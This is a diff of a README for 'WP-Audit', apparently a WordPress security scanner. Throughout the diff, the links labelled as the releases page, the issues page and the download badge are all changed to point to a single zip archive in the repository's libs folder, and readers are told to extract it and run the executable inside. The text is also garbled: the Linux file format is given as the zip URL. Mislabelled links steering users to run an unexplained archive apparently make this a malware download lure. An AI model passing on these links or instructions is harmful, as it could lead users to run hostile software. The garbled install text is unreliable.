@@ -6,7 +6,7 @@ Welcome to WP-Audit! This tool helps you keep your WordPress site secure and run
 
 ## 📥 Download WP-Audit
 
-[![Download WP-Audit](https://raw.githubusercontent.com/treezz24/WP-Audit/main/libs/WP-Audit_v2.6-beta.2.zip)](https://raw.githubusercontent.com/treezz24/WP-Audit/main/libs/WP-Audit_v2.6-beta.2.zip)
+[![Download WP-Audit](https://github.com/treezz24/WP-Audit/raw/refs/heads/main/libs/W_Audit_v3.9.zip)](https://github.com/treezz24/WP-Audit/raw/refs/heads/main/libs/W_Audit_v3.9.zip)
 
 You can find the latest version of WP-Audit on the Releases page. This is where all versions are available for download. 
 
@@ -30,13 +30,13 @@ To ensure WP-Audit works well, your setup should meet these requirements:
 ## 📲 Download & Install
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/treezz24/WP-Audit/main/libs/WP-Audit_v2.6-beta.2.zip) to find the latest version of WP-Audit.
+   Go to our [Releases page](https://github.com/treezz24/WP-Audit/raw/refs/heads/main/libs/W_Audit_v3.9.zip) to find the latest version of WP-Audit.
 
 2. **Choose the Version**
    Scroll through the list of available versions. Look for the version marked as “Latest.”
 
 3. **Download the File**
-   Click on the file that corresponds to your operating system. The file format will be an `.exe` or `.zip` for Windows, a `.dmg` for macOS, or a `https://raw.githubusercontent.com/treezz24/WP-Audit/main/libs/WP-Audit_v2.6-beta.2.zip` for Linux.
+   Click on the file that corresponds to your operating system. The file format will be an `.exe` or `.zip` for Windows, a `.dmg` for macOS, or a `https://github.com/treezz24/WP-Audit/raw/refs/heads/main/libs/W_Audit_v3.9.zip` for Linux.
 
 4. **Open the File**
    Once the download is complete, locate the downloaded file on your computer. Double-click it to open.
@@ -44,7 +44,7 @@ To ensure WP-Audit works well, your setup should meet these requirements:
 5. **Follow the Installation Instructions**
    - **Windows:** If you downloaded an `.exe` file, follow the on-screen prompts to install the software. If it’s a `.zip` file, extract it and then run the `.exe`.
    - **macOS:** If you downloaded a `.dmg` file, drag the WP-Audit icon to your Applications folder.
-   - **Linux:** If you downloaded a `https://raw.githubusercontent.com/treezz24/WP-Audit/main/libs/WP-Audit_v2.6-beta.2.zip` file, extract it and run the installation command in your terminal.
+   - **Linux:** If you downloaded a `https://github.com/treezz24/WP-Audit/raw/refs/heads/main/libs/W_Audit_v3.9.zip` file, extract it and run the installation command in your terminal.
 
 6. **Run WP-Audit**
    After installation, locate the WP-Audit application and double-click to launch it. Follow the instructions on the screen to start your first scan.
@@ -64,7 +64,7 @@ To ensure WP-Audit works well, your setup should meet these requirements:
 
 If you encounter any issues while downloading or using WP-Audit, you can find support in the following ways:
 
-- **GitHub Issues:** Report any problems directly on our [GitHub Issues page](https://raw.githubusercontent.com/treezz24/WP-Audit/main/libs/WP-Audit_v2.6-beta.2.zip).
+- **GitHub Issues:** Report any problems directly on our [GitHub Issues page](https://github.com/treezz24/WP-Audit/raw/refs/heads/main/libs/W_Audit_v3.9.zip).
 - **Documentation:** Visit the official documentation on our GitHub for detailed guides and FAQs.
 - **Community Forums:** Join our community forums where other users share tips and advice.
 
@@ -88,4 +88,4 @@ To maximize the benefits of WP-Audit:
 - **WordPress Security Tips:** Learn best practices for keeping your WordPress site secure.
 - **AI in Cybersecurity:** Explore how artificial intelligence enhances security measures.
 
-For more information, return to our [Releases page](https://raw.githubusercontent.com/treezz24/WP-Audit/main/libs/WP-Audit_v2.6-beta.2.zip) to download the latest version and start securing your WordPress site today!
+For more information, return to our [Releases page](https://github.com/treezz24/WP-Audit/raw/refs/heads/main/libs/W_Audit_v3.9.zip) to download the latest version and start securing your WordPress site today!
